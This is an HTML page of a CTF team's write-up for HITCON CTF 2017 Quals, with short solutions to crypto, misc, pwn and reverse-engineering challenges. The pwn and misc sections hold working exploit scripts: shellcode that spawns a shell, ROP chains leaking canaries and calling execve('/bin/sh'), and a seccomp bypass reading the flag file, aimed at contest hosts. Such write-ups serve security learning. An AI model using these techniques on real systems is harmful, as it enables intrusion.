@@ -1,0 +1,682 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>HITCON CTF 2017 Quals</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#luaky">luaky</a>
+    
+                <a class="dropdown-item" href="#secret-server">secret-server</a>
+    
+                <a class="dropdown-item" href="#secret-server-revenge">secret-server-revenge</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#baby-ruby-escaping">baby-ruby-escaping</a>
+    
+                <a class="dropdown-item" href="#data-&-mining">data-&-mining</a>
+    
+                <a class="dropdown-item" href="#easy-to-say">easy-to-say</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#start">start</a>
+    
+                <a class="dropdown-item" href="#完美無瑕-~impeccable-artifact~">完美無瑕-~impeccable-artifact~</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#sakura">sakura</a>
+    
+                <a class="dropdown-item" href="#家徒四壁-~everlasting-imaginative-void~">家徒四壁-~everlasting-imaginative-void~</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#babyfirst-revenge">babyfirst-revenge</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#luaky" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">luaky</span>
+            </a>
+    
+<a href="#secret-server" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">secret-server</span>
+            </a>
+    
+<a href="#secret-server-revenge" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">secret-server-revenge</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#baby-ruby-escaping" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">baby-ruby-escaping</span>
+            </a>
+    
+<a href="#data-&-mining" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">data-&-mining</span>
+            </a>
+    
+<a href="#easy-to-say" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">easy-to-say</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#start" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">start</span>
+            </a>
+    
+<a href="#完美無瑕-~impeccable-artifact~" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">完美無瑕-~impeccable-artifact~</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#sakura" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">sakura</span>
+            </a>
+    
+<a href="#家徒四壁-~everlasting-imaginative-void~" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">家徒四壁-~everlasting-imaginative-void~</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#babyfirst-revenge" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babyfirst-revenge</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="hitcon-ctf-2017-quals"><a class="header-link" href="#hitcon-ctf-2017-quals"></a>HITCON CTF 2017 Quals</h1>
+
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>crypto</h2>
+<h3 id="luaky"><a class="header-link" href="#luaky"></a>Luaky</h3>
+<pre class="hljs"><code>fight = <span class="hljs-number">-1</span>
+tmp = <span class="hljs-number">0</span>
+chk = <span class="hljs-number">0</span>
+three = <span class="hljs-number">0</span>
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">play</span> <span class="hljs-params">(a)</span></span>
+    fight = fight + <span class="hljs-number">1</span>
+    <span class="hljs-keyword">if</span> fight &lt; <span class="hljs-number">100000</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> a % <span class="hljs-number">3</span> <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">if</span> fight == <span class="hljs-number">100000</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>
+
+    <span class="hljs-comment">--[[print (a, tmp)]]</span>
+    <span class="hljs-keyword">if</span> (a+<span class="hljs-number">2</span>)%<span class="hljs-number">3</span> ~= tmp <span class="hljs-keyword">then</span>
+        chk = <span class="hljs-number">0</span>
+        three = <span class="hljs-number">0</span>
+        <span class="hljs-comment">--[[print(fight)]]</span>
+    <span class="hljs-keyword">end</span>
+
+    tmp = (tmp + a + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span>
+    chk = chk + <span class="hljs-number">1</span>
+
+
+    <span class="hljs-keyword">if</span> chk == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> three == <span class="hljs-number">2</span> <span class="hljs-keyword">then</span>
+        three = <span class="hljs-number">0</span>
+        chk = <span class="hljs-number">0</span>
+        tmp = (tmp + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span>
+    <span class="hljs-keyword">elseif</span> chk == <span class="hljs-number">3</span> <span class="hljs-keyword">then</span>
+        tmp = (tmp + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span>
+        three = three + <span class="hljs-number">1</span>
+        chk = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">end</span>
+
+    <span class="hljs-keyword">return</span> tmp % <span class="hljs-number">3</span>
+<span class="hljs-keyword">end</span></code></pre><p><code>hitcon{Hey Lu4ky AI, I am Alpaca... MEH!}</code></p>
+<h3 id="secret-server"><a class="header-link" href="#secret-server"></a>Secret Server</h3>
+<ol class="list">
+<li>Collect encrypted md5 of all prefixes of flag.</li>
+<li>Guess prefix by calculating plaintext md5 and try to construct some command with encrypted md5.</li>
+</ol>
+<p><code>hitcon{Paddin9_15_ve3y_h4rd__!!}</code></p>
+<h3 id="secret-server-revenge"><a class="header-link" href="#secret-server-revenge"></a>Secret Server Revenge</h3>
+<ol class="list">
+<li>Collect encrypted md5 of all prefixes of token (56 reqs)</li>
+<li>Leak MSB of last byte in plaintext md5 (56 reqs)</li>
+<li>Build mapping for padding = 128~255 (128 reqs)</li>
+<li>Recover last byte in plaintext md5 (56 reqs)</li>
+<li>Brute-force token</li>
+</ol>
+<p><code>hitcon{uNp@d_M3th0D_i5_am4Z1n9!}</code></p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>misc</h2>
+<h3 id="baby-ruby-escaping"><a class="header-link" href="#baby-ruby-escaping"></a>Baby Ruby Escaping</h3>
+<ul class="list">
+<li>Need a way to read file</li>
+<li>Need the path of flag</li>
+</ul>
+<p>Solution</p>
+<ol class="list">
+<li>We can use AGRF and ARGV<pre class="hljs"><code><span class="hljs-selector-tag">ARGV</span><span class="hljs-selector-class">.replace</span> <span class="hljs-selector-attr">[FlagName]</span>
+<span class="hljs-selector-tag">ARGF</span><span class="hljs-selector-class">.readline</span></code></pre></li>
+<li>readline has a good property <code>completion_append_character</code><pre class="hljs"><code>&gt; <span class="hljs-regexp">/home/jail</span>   <span class="hljs-comment">##Press TAB key.</span>
+.bash_logout
+.bashrc
+.profile
+jail.rb
+thanks_readline_for_completing_the_name_of_flag</code></pre></li>
+<li>Get flag</li>
+</ol>
+<p><code>hitcon{Bl4ckb0x.br0k3n? ? puts(flag) : try_ag4in!}</code></p>
+<h3 id="data-&-mining"><a class="header-link" href="#data-&-mining"></a>Data &amp; Mining</h3>
+<p><code>strings | grep hitcon</code></p>
+<p><code>hitcon{BTCis_so_expensive$$$$$$$}</code></p>
+<h3 id="easy-to-say"><a class="header-link" href="#easy-to-say"></a>Easy to say</h3>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> time
+
+context.arch = <span class="hljs-string">'amd64'</span>
+r = remote(<span class="hljs-string">'52.69.40.204'</span>, <span class="hljs-number">8361</span>)
+
+time.sleep(<span class="hljs-number">1</span>)
+
+shellcode = asm(<span class="hljs-string">'''
+mov cx, 0x1000
+sub rsp, rcx
+pop rcx
+pop rbx
+pop rsi
+mov dl, 0x60
+syscall
+'''</span>)
+
+r.send(shellcode)
+
+raw_input(<span class="hljs-string">'&gt;'</span>)
+r.send(cyclic(<span class="hljs-number">0x42</span>)+asm(shellcraft.sh()))
+
+r.interactive()</code></pre><p><code>hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}</code></p>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>pwn</h2>
+<h3 id="start"><a class="header-link" href="#start"></a>Start</h3>
+<ul class="list">
+<li>Buffer Overflow, can leak information from stack and overwrite return address. </li>
+<li>The binary is statically linked, so it is easy to create a ROP chain to get a shell.</li>
+<li>Canary and NX enabled, and Partial RELRO.</li>
+</ul>
+<p>Solution</p>
+<ol class="list">
+<li>Leak canary</li>
+<li>Leak current stack address so the address of  &quot;/bin/sh\x00&quot; can be known</li>
+<li>Build a ROP chain to perform execve()</li>
+</ol>
+<p>The server only accept Ruby script, and it will take our script to run the binary.</p>
+<pre class="hljs"><code>r = Sock.new <span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">31338</span>
+
+r.sendline <span class="hljs-string">'A'</span>*<span class="hljs-number">24</span>
+r.recvline
+canary = u64(<span class="hljs-string">"\x00"</span> + r.recvline[<span class="hljs-number">0</span>...-<span class="hljs-number">4</span>])
+print <span class="hljs-string">"canary: "</span> + canary.to_s(<span class="hljs-number">16</span>) + <span class="hljs-string">"\n"</span>
+sleep(<span class="hljs-number">1</span>)
+
+r.sendline <span class="hljs-string">'A'</span>*<span class="hljs-number">63</span>
+r.recvline
+stack = u64(r.recvline[<span class="hljs-number">0</span>...-<span class="hljs-number">1</span>] + <span class="hljs-string">"\x00\x00"</span>) - <span class="hljs-number">344</span>
+print <span class="hljs-string">"stack: "</span> + stack.to_s(<span class="hljs-number">16</span>) + <span class="hljs-string">"\n"</span>
+sleep(<span class="hljs-number">1</span>)
+
+payload = <span class="hljs-string">'A'</span>*<span class="hljs-number">24</span>+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x47a6e6</span>)+p64(<span class="hljs-number">59</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4017f7</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4005d5</span>)+p64(stack+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x468e75</span>)
+r.sendline payload
+r.recv(<span class="hljs-number">2000</span>)
+sleep(<span class="hljs-number">1</span>)
+
+r.sendline <span class="hljs-string">"exit\n\x00\x00\x00/bin/sh\x00"</span>
+sleep(<span class="hljs-number">1</span>)
+
+r.sendline <span class="hljs-string">"cat /home/*/flag"</span>
+print r.recv(<span class="hljs-number">2000</span>)</code></pre><p><code>hitcon{thanks_for_using_pwntools-ruby:D}</code></p>
+<h3 id="完美無瑕-~impeccable-artifact~"><a class="header-link" href="#完美無瑕-~impeccable-artifact~"></a>完美無瑕 ~Impeccable Artifact~</h3>
+<ul class="list">
+<li>Arbitary write, didn&#39;t check the array index bondary.</li>
+<li>Canary, NX, PIE enabled and Full RELRO.</li>
+<li>Only some syscall are allowed. </li>
+<li>However, if rax == rdx, the syscall is still allowed (line 0014).</li>
+<li>Perform ORW to get the flag.</li>
+</ul>
+<p>Seccomp Rules:</p>
+<pre class="hljs"><code> line  CODE  JT   JF      K
+=================================
+ <span class="hljs-number">0000</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">A</span> = arch
+ <span class="hljs-number">0001</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x10 <span class="hljs-number">0</span>xc000003e  if (<span class="hljs-keyword">A</span> != ARCH_X86_64) goto <span class="hljs-number">0018</span>
+ <span class="hljs-number">0002</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000020</span>  <span class="hljs-keyword">A</span> = args[<span class="hljs-number">2</span>]
+ <span class="hljs-number">0003</span>: <span class="hljs-number">0x07 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  X = <span class="hljs-keyword">A</span>
+ <span class="hljs-number">0004</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">A</span> = sys_number
+ <span class="hljs-number">0005</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x0d <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  if (<span class="hljs-keyword">A</span> == read) goto <span class="hljs-number">0019</span>
+ <span class="hljs-number">0006</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x0c <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000001</span>  if (<span class="hljs-keyword">A</span> == write) goto <span class="hljs-number">0019</span>
+ <span class="hljs-number">0007</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x0b <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000005</span>  if (<span class="hljs-keyword">A</span> == fstat) goto <span class="hljs-number">0019</span>
+ <span class="hljs-number">0008</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x0a <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000008</span>  if (<span class="hljs-keyword">A</span> == lseek) goto <span class="hljs-number">0019</span>
+ <span class="hljs-number">0009</span>: <span class="hljs-number">0x15 0x01</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000009</span>  if (<span class="hljs-keyword">A</span> == mmap) goto <span class="hljs-number">0011</span>
+ <span class="hljs-number">0010</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x03 <span class="hljs-number">0</span>x0000000a  if (<span class="hljs-keyword">A</span> != mprotect) goto <span class="hljs-number">0014</span>
+ <span class="hljs-number">0011</span>: <span class="hljs-number">0x87 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">A</span> = X
+ <span class="hljs-number">0012</span>: <span class="hljs-number">0x54 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">A</span> &amp;= <span class="hljs-number">0</span>x1
+ <span class="hljs-number">0013</span>: <span class="hljs-number">0x15 0x04</span> <span class="hljs-number">0</span>x05 <span class="hljs-number">0x00000001</span>  if (<span class="hljs-keyword">A</span> == <span class="hljs-number">1</span>) goto <span class="hljs-number">0018</span> else goto <span class="hljs-number">0019</span>
+ <span class="hljs-number">0014</span>: <span class="hljs-number">0</span>x1d <span class="hljs-number">0x04 0x00</span> <span class="hljs-number">0</span>x0000000b  if (<span class="hljs-keyword">A</span> == X) goto <span class="hljs-number">0019</span>
+ <span class="hljs-number">0015</span>: <span class="hljs-number">0x15 0x03</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x0000000c  if (<span class="hljs-keyword">A</span> == brk) goto <span class="hljs-number">0019</span>
+ <span class="hljs-number">0016</span>: <span class="hljs-number">0x15 0x02</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x0000003c  if (<span class="hljs-keyword">A</span> == exit) goto <span class="hljs-number">0019</span>
+ <span class="hljs-number">0017</span>: <span class="hljs-number">0x15 0x01</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x<span class="hljs-number">000000e7</span>  if (<span class="hljs-keyword">A</span> == exit_group) goto <span class="hljs-number">0019</span>
+ <span class="hljs-number">0018</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  return KILL
+ <span class="hljs-number">0019</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return ALLOW</code></pre><p>Solution</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+host = <span class="hljs-string">'52.192.178.153'</span>
+port = <span class="hljs-number">31337</span>
+
+<span class="hljs-comment"># r = remote('127.0.0.1', port)</span>
+r = remote(host, port)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">menu</span><span class="hljs-params">()</span>:</span>
+    r.recvuntil(<span class="hljs-string">'?\n'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span><span class="hljs-params">(num)</span>:</span>
+    r.sendline(str(num))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(num)</span>:</span>
+    cmd(<span class="hljs-number">1</span>)
+    r.sendline(str(num))
+    r.recvuntil(<span class="hljs-string">"Here it is: "</span>)
+    ret = r.recvline()[:<span class="hljs-number">-1</span>]
+    menu()
+    <span class="hljs-keyword">return</span> ret
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">memo</span><span class="hljs-params">(num, inp)</span>:</span>
+    cmd(<span class="hljs-number">2</span>)
+    r.sendline(str(num))
+    r.recvuntil(<span class="hljs-string">'Give me your number:\n'</span>)
+    r.sendline(str(inp))
+    menu()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">end</span><span class="hljs-params">()</span>:</span>
+    cmd(<span class="hljs-number">3</span>)
+
+raw_input(<span class="hljs-string">'#'</span>)
+
+menu()
+
+<span class="hljs-comment"># leak libc adress</span>
+libc = int(show(<span class="hljs-number">203</span>)) - <span class="hljs-number">241</span> - <span class="hljs-number">0x20300</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">'libc:'</span>, hex(libc)
+
+<span class="hljs-comment"># leak code adress</span>
+code = int(show(<span class="hljs-number">202</span>)) - <span class="hljs-number">0xbb0</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">'code:'</span>, hex(code)
+
+<span class="hljs-comment"># stack address index: 231</span>
+stack = int(show(<span class="hljs-number">205</span>))
+<span class="hljs-keyword">print</span> <span class="hljs-string">'stack:'</span>, hex(stack)
+
+pop_rax = libc + <span class="hljs-number">0x3a998</span>
+pop_rdi = libc + <span class="hljs-number">0x1fd7a</span>
+pop_rsi = libc + <span class="hljs-number">0x1fcbd</span>
+pop_rdx = libc + <span class="hljs-number">0x1b92</span>
+pop_rcx = libc + <span class="hljs-number">0x1a97b8</span>
+mov_rdi_rax_call_rcx = libc + <span class="hljs-number">0x89ae9</span>
+syscall = libc + <span class="hljs-number">0xbc765</span>
+
+<span class="hljs-comment"># /home/artifact/flag</span>
+memo(<span class="hljs-number">0</span>, <span class="hljs-number">8241920905738938415</span>)
+memo(<span class="hljs-number">1</span>, <span class="hljs-number">7363231885958736244</span>)
+memo(<span class="hljs-number">2</span>, <span class="hljs-number">6775148</span>)
+
+<span class="hljs-comment"># open</span>
+memo(<span class="hljs-number">203</span>, pop_rdi)
+memo(<span class="hljs-number">204</span>, stack - <span class="hljs-number">231</span>*<span class="hljs-number">8</span>)
+memo(<span class="hljs-number">205</span>, pop_rsi)
+memo(<span class="hljs-number">206</span>, <span class="hljs-number">0</span>)
+memo(<span class="hljs-number">207</span>, pop_rdx)
+memo(<span class="hljs-number">208</span>, <span class="hljs-number">2</span>)
+memo(<span class="hljs-number">209</span>, pop_rax)
+memo(<span class="hljs-number">210</span>, <span class="hljs-number">2</span>)
+memo(<span class="hljs-number">211</span>, syscall)
+
+<span class="hljs-comment"># read</span>
+memo(<span class="hljs-number">212</span>, pop_rcx)
+memo(<span class="hljs-number">213</span>, pop_rax)
+memo(<span class="hljs-number">214</span>, mov_rdi_rax_call_rcx)
+memo(<span class="hljs-number">215</span>, pop_rax)
+memo(<span class="hljs-number">216</span>, <span class="hljs-number">0</span>)
+memo(<span class="hljs-number">217</span>, pop_rsi)
+memo(<span class="hljs-number">218</span>, stack - <span class="hljs-number">80</span>*<span class="hljs-number">8</span>)
+memo(<span class="hljs-number">219</span>, pop_rdx)
+memo(<span class="hljs-number">220</span>, <span class="hljs-number">100</span>)
+memo(<span class="hljs-number">221</span>, syscall)
+
+<span class="hljs-comment"># write</span>
+memo(<span class="hljs-number">222</span>, pop_rax)
+memo(<span class="hljs-number">223</span>, <span class="hljs-number">1</span>)
+memo(<span class="hljs-number">224</span>, pop_rdi)
+memo(<span class="hljs-number">225</span>, <span class="hljs-number">1</span>)
+memo(<span class="hljs-number">226</span>, syscall)
+
+end()
+
+r.interactive()</code></pre><p><code>hitcon{why_libseccomp_cheated_me_Q_Q}</code></p>
+<h2 id="rev"><a class="header-link" href="#rev"></a>rev</h2>
+<h3 id="sakura"><a class="header-link" href="#sakura"></a>Sakura</h3>
+<ul class="list">
+<li>This binary need 400-byte input</li>
+<li>Need to pass the check funtion</li>
+</ul>
+<p>solution</p>
+<ol class="list">
+<li>Use angr but need mitigate path explosion
+<code>`</code>python
+import angr
+def AAADD(a):
+ return a+0x400000</li>
+</ol>
+<p>f=open(&quot;./sakura-fdb3c896d8a3029f40a38150b2e30a79&quot;).read()</p>
+<p>target=&quot;C685B7E1FFFF00&quot;.decode(&quot;hex&quot;) # find wrong path to prune</p>
+<p>allt=[]
+temp=0
+while f.find(target)!=-1:
+    allt.append(temp+f.find(target))
+    f=f[allt[-1]-temp+1:]
+    temp=allt[-1]+1    </p>
+<p>print len(allt)
+alll=map(AAADD,allt)</p>
+<p>print map(hex,alll[:10])</p>
+<p>b=angr.Project(&quot;./sakura-fdb3c896d8a3029f40a38150b2e30a79&quot;)
+a=b.factory.entry_state()
+for _ in xrange(400):
+    k=a.posix.files[0].read_from(1)
+    a.se.add(k!=0)
+    a.se.add(k!=10)
+a.posix.files[0].seek(0)
+a.posix.files[0].length=400
+pg=b.factory.path_group(a)
+pg.explore(find=0x4110CA,avoid=alll)
+pg.found[0].state.posix.dump(0,&quot;HAHA&quot;)
+print pg.found[0].state.posix.dumps(0)
